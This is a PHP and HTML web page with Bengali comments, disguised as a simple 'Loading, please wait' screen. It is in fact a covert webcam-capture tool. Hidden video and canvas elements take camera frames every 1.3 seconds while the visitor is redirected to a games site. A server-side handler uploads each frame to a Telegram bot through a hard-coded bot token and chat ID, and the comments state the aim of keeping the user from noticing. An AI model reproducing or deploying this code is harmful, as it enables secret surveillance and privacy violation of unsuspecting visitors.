<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    
    $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
    $chatId = "5896019931";

    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $imgData = $_POST['image'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = str_replace(' ', '+', $imgData);
    $data = base64_decode($imgData);

    $fileName = 'img_' . uniqid() . '.png';
    $filePath = $uploadDir . $fileName;

    if (file_put_contents($filePath, $data)) {
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        
        $postFields = [
            'chat_id' => $chatId,
            'caption' => "Captured: " . $fileName,
            'photo'   => new CURLFile(realpath($filePath))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 

        curl_exec($ch);
        curl_close($ch);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #ffffff;
        }
        /* ইউজার যাতে বুঝতে না পারে তাই সিম্পল একটি লোডিং স্ক্রিন */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h3>Loading, please wait...</h3>
    
    <!-- ভিডিও এবং ক্যানভাস হাইড করা থাকবে যাতে কেউ বুঝতে না পারে -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // অটোমেটিক পারমিশন নেওয়ার চেষ্টা এবং ব্যাকগ্রাউন্ডে প্রসেস রান করা
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                
                // ক্যামেরা চালু হওয়ার ১ সেকেন্ড পর ছবি তোলার লুপ শুরু এবং সাথে সাথে রিডাইরেক্ট
                setTimeout(() => {
                    // প্রতি ১.৩ সেকেন্ড (1300ms) পর পর ছবি ক্যাপচার হবে
                    setInterval(captureAndUpload, 1300);

                    // কাঙ্ক্ষিত ওয়েবসাইটে রিডাইরেক্ট করে দেওয়া
                    window.location.href = "https://www.aapunkagames.com/";
                }, 1000);
            })
            .catch(err => {
                console.error("Camera error: ", err);
                // পারমিশন না দিলেও ইউজারকে রিডাইরেক্ট করে দেওয়া নিরাপদ
                window.location.href = "https://www.aapunkagames.com/";
            });

        function captureAndUpload() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'image=' + encodeURIComponent(imageData)
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
